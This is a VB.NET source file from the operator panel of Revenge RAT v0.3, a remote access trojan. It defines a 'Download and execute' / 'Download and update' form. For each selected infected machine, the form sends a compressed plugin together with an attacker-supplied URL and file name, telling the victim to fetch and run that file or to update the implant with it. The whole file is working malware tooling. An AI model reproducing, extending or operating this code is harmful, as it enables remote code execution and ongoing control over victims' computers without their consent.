Imports Microsoft.VisualBasic.CompilerServices
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class DAE
    Private Sub DAE_Load(sender As Object, e As EventArgs) Handles Me.Load
        If (Me.Text = "Download and execute") Then
            Me.DAEC.Text = "Download and execute"
        Else
            Me.DAEC.Text = "Download and update"
        End If
    End Sub

    Private Sub DAEC_Click(sender As Object, e As EventArgs) Handles DAEC.Click
        If ((Me.URL.Text.Length > 0) AndAlso (Me.FN.Text.Length > 0)) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = My.Forms.Main.ListView1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (Me.Text = "Download and execute") Then
                        My.Forms.Main.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"UNV", My.Forms.Main.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), My.Forms.Main.Key, "UNI.UNI", My.Forms.Main.Key, My.Forms.Main.RandomVariable(5, 8), My.Forms.Main.Key, "False", My.Forms.Main.Key, "False", My.Forms.Main.Key, "True", My.Forms.Main.Key, Me.URL.Text, My.Forms.Main.Key, Me.FN.Text, My.Forms.Main.Key, "False", My.Forms.Main.Key, "False", My.Forms.Main.Key, SocketServer.GenRandom(1, 10), ".tmp", My.Forms.Main.RandomVariable(1, 5), My.Forms.Main.Key, My.Forms.Main.RandomVariable(1, 5), My.Forms.Main.Key, "False"}))
                    Else
                        My.Forms.Main.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"UNV", My.Forms.Main.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), My.Forms.Main.Key, "UNI.UNI", My.Forms.Main.Key, My.Forms.Main.RandomVariable(5, 8), My.Forms.Main.Key, "False", My.Forms.Main.Key, "False", My.Forms.Main.Key, "True", My.Forms.Main.Key, Me.URL.Text, My.Forms.Main.Key, Me.FN.Text, My.Forms.Main.Key, "True", My.Forms.Main.Key, "False", My.Forms.Main.Key, SocketServer.GenRandom(1, 10), ".tmp", My.Forms.Main.RandomVariable(1, 5), My.Forms.Main.Key, My.Forms.Main.RandomVariable(1, 5), My.Forms.Main.Key, "False"}))
                    End If
                Loop
            Finally
            End Try
            Me.Close()
        End If
    End Sub
End Class